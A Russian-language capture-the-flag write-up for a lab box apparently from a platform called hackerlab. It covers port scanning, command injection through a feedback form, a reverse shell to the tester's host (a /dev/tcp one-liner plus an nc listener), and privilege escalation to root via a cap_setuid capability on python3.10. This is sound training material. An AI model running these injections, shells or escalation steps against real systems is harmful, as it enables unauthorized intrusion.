#легкая #пентест #hackerlab #pinkot
## Разведка
1) Просканировал ip 192.168.2.219 с помощью nmap, используя следующие команды:
```
nmap -sC -sV 192.168.2.219
```
а также 
```
nmap -p- 192.168.2.219
```
2) на этапе разведки получил следующую информацию

Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-14 21:56 MSK
Nmap scan report for 192.168.2.219
Host is up (0.041s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4c:70:d6:90:e9:ec:d1:f7:ef:d2:5b:d5:44:bf:67:c6 (ECDSA)
|_  256 a6:42:dd:0d:0e:8a:ef:f8:76:49:e1:10:5d:4c:fc:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: GreenEdge Portal
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

3) помимо этого пофаззил с помощью dirsearch, с последующим выводом
 [21:56:28] 200 -  317B  - /about.php
[21:56:38] 200 -    0B  - /config.php
[21:56:39] 200 -   44B  - /contact.php
[21:56:43] 200 -  385B  - /feedback.php
[21:56:43] 200 -   26B  - /footer.php
[21:56:44] 200 -  225B  - /header.php
[21:56:46] 301 -  319B  - /javascript  ->  http://192.168.2.219/javascript/
[21:56:57] 403 -  278B  - /server-status/
[21:56:57] 403 -  278B  - /server-status
[21:57:00] 301 -  315B  - /static  ->  http://192.168.2.219/static/

## Выбор вектора атаки
1) Сначала меня смутила версия ssh (OpenSSH 8.9p1 ), и была предпринята попытка воспользоваться CVE-2024-6387 (https://github.com/Karmakstylez/CVE-2024-6387)
   Но попытки перехватить сессию не увенчались успехом.
2) Потом я зашел на страчку  192.168.2.219:80, интересным сразу стало поля длы feedback (также это видно после фаззинга dirsearch)
3) Окошко писало:
   Message sent successfully
   Content: <вывод написанного пользаком>
4) В попытках найти уязвимость, была принята попытка ввести js-скрипт
   ```
   <script>alert('XSS')</script>
   ```
   На что ответ был: Content: <пусто>
# Эскплутация 
 1) Потыкав, была обнаружена Comand Injection
 на ввод: ``` ;ls   ``` следовал ответ 
   ```
   about.php
   config.php
   contact.php
   feedback.php
   footer.php
   header.php
   index.php
   static
   ```
   2) в директории   ```static   ``` была обнаружена директория ```css   ``` где был обнаружен файл style.css с правами rwxrwxrwx, 
  3)  я переименовал файл в main (для удобства) а также изменил содержимое, убедившись в том что это работает  я решил залить в файл шелл (пользовался эти сайтом https://www.revshells.com/ )
### В окошке сайта
```
   ;mv static/css/style.css static/css/main
   ;echo "sh -i >& /dev/tcp/192.168.119.18/4440 0>&1" > static/css/main
   ;bash static/css/main
```
###       На xосте
```
nc -lvnp 4440
```
4) Таким образом я смог подлючиться к удаленному серверу. Зайти удалось под пользователем www-data (```whoami```), и доступ к некоторым файлам и директориям был закрыт. Структура файловая система настораживала, поэтому после ```ls -ahl | grep docker``` был обнаружен файл .dockerenv, и тогда я понял, что нахожусь в контейнере.
5) Перемещаюсь внутри контейнера в tmp был обнаружен linpeas.sh с правами на исполнение ```./linpeas.sh```  
6) После его исполенения в поле Capabilities была найдена строчка ```/usr/bin/python3.1cap_setuid=ep```
файлу /usr/bin/python3.10 установлена capability 
cap_setuid похволяет программе произвольно менять UID (идентификатор пользака), флаг ep означает что капабилити активна  и разрешена к использованию
7) Я запустил следующую команду:
```
/usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

import os позволил импортировать модуль для работы с OC
os.setuid(0) Установил UID 0 (root)
os.system("/bin/bash") позволил мне запустить shell (/bin/bash), таким образом скрипт запустился от имени root

Под root я пошарился по директориям, зашел в root и home/charley где и нашел кусочки флага собрав один  CODEBY{FR0M_F33DB4CK_70_R007_1337}
Та-дааам флаг найден))
